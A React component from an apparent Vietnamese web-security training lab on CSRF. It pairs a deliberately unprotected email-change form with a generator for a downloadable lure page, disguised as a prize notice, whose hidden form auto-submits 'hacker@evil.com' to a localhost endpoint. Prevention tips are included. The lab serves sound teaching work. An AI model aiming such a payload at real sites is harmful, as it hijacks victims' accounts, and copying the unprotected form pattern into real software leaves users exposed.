import { useState } from 'react';
import { useAuth } from '../../context/AuthContext';
import { progressAPI } from '../../services/api';
import './Lab.css';

function Lab11() {
  const [email, setEmail] = useState('user@example.com');
  const [newEmail, setNewEmail] = useState('');
  const [generatedHTML, setGeneratedHTML] = useState('');
  const [success, setSuccess] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [pointsEarned, setPointsEarned] = useState(0);
  const { isAuthenticated } = useAuth();

  const submitProgress = async (payload, completed) => {
    if (!isAuthenticated() || submitting) return;
    
    setSubmitting(true);
    try {
      const response = await progressAPI.submitLab(11, payload, completed);
      if (completed && response.pointsEarned) {
        setPointsEarned(response.pointsEarned);
      }
    } catch (error) {
      console.error('Error submitting progress:', error);
    } finally {
      setSubmitting(false);
    }
  };

  const handleChangeEmail = (e) => {
    e.preventDefault();
    
    // Simulate email change (vulnerable to CSRF)
    setEmail(newEmail);
    alert(`✅ Email đã được thay đổi thành: ${newEmail}`);
    setNewEmail('');
  };

  const generateCSRF = () => {
    const csrfHTML = `<!DOCTYPE html>
<html>
<head>
  <title>Giải thưởng may mắn!</title>
</head>
<body>
  <h1>🎁 Chúc mừng! Bạn đã trúng thưởng!</h1>
  <p>Click vào nút bên dưới để nhận quà...</p>
  
  <!-- CSRF Attack Form -->
  <form id="csrfForm" action="http://localhost:5173/lab/11" method="POST" style="display:none;">
    <input type="text" name="email" value="hacker@evil.com" />
  </form>
  
  <button onclick="document.getElementById('csrfForm').submit()">
    🎉 Nhận quà ngay!
  </button>
  
  <script>
    // Auto-submit after 2 seconds
    setTimeout(() => {
      document.getElementById('csrfForm').submit();
    }, 2000);
  </script>
</body>
</html>`;

    setGeneratedHTML(csrfHTML);
    setSuccess(true);
    submitProgress(csrfHTML, true);
  };

  const downloadHTML = () => {
    const blob = new Blob([generatedHTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'csrf_attack.html';
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="lab-container">
      <div className="lab-header">
        <h2>Lab 11: CSRF - Change Email</h2>
        <span className="difficulty-badge medium">Trung bình</span>
      </div>

      <div className="lab-description">
        <h3>📋 Mô tả</h3>
        <p>
          Ứng dụng cho phép thay đổi email mà không có token CSRF protection.
          Kẻ tấn công có thể tạo một trang HTML để thay đổi email của nạn nhân.
        </p>
        
        <h3>🎯 Mục tiêu</h3>
        <p>Tạo một trang HTML có form tự động submit để thay đổi email người dùng</p>

        <h3>💡 Gợi ý</h3>
        <ul>
          <li>Tạo một form HTML với action trỏ đến endpoint thay đổi email</li>
          <li>Sử dụng JavaScript để tự động submit form</li>
          <li>Có thể ẩn form bằng <code>style="display:none;"</code></li>
          <li>Click "Generate CSRF Payload" để xem ví dụ</li>
        </ul>
      </div>

      {success && (
        <div className="success-message">
          🎉 Chúc mừng! Bạn đã tạo thành công CSRF payload!
          {pointsEarned > 0 && <div className="points-earned">+{pointsEarned} điểm</div>}
        </div>
      )}

      <div className="lab-content">
        <div className="vulnerable-section">
          <h3>📧 Thay đổi Email (Vulnerable)</h3>
          <form onSubmit={handleChangeEmail}>
            <div className="form-group">
              <label>Email hiện tại:</label>
              <input
                type="text"
                value={email}
                disabled
                className="vulnerable-input"
              />
            </div>
            <div className="form-group">
              <label>Email mới:</label>
              <input
                type="email"
                value={newEmail}
                onChange={(e) => setNewEmail(e.target.value)}
                placeholder="Nhập email mới"
                className="vulnerable-input"
              />
            </div>
            <button type="submit" className="submit-btn">
              Cập nhật Email
            </button>
          </form>
        </div>

        <div className="attack-section">
          <h3>⚔️ CSRF Attack Generator</h3>
          <button onClick={generateCSRF} className="generate-btn">
            🔧 Generate CSRF Payload
          </button>

          {generatedHTML && (
            <div className="payload-result">
              <h4>💻 HTML Payload:</h4>
              <pre>{generatedHTML}</pre>
              <button onClick={downloadHTML} className="download-btn">
                💾 Download HTML File
              </button>
            </div>
          )}
        </div>

        <div className="info-box">
          <h4>ℹ️ CSRF Attack Flow</h4>
          <ol style={{textAlign: 'left', marginLeft: '1rem'}}>
            <li>Attacker tạo trang HTML độc hại với form tự động submit</li>
            <li>Victim truy cập trang HTML (qua link, email, etc.)</li>
            <li>Form tự động submit request đến server</li>
            <li>Server thực hiện thay đổi email vì không có CSRF token</li>
            <li>Email của victim bị thay đổi thành email của attacker</li>
          </ol>
          
          <h4 style={{marginTop: '1rem'}}>🛡️ Prevention</h4>
          <ul style={{textAlign: 'left', marginLeft: '1rem'}}>
            <li>Sử dụng CSRF Token</li>
            <li>Kiểm tra SameSite cookie attribute</li>
            <li>Xác thực lại mật khẩu cho thao tác nhạy cảm</li>
          </ul>
        </div>
      </div>
    </div>
  );
}

export default Lab11;
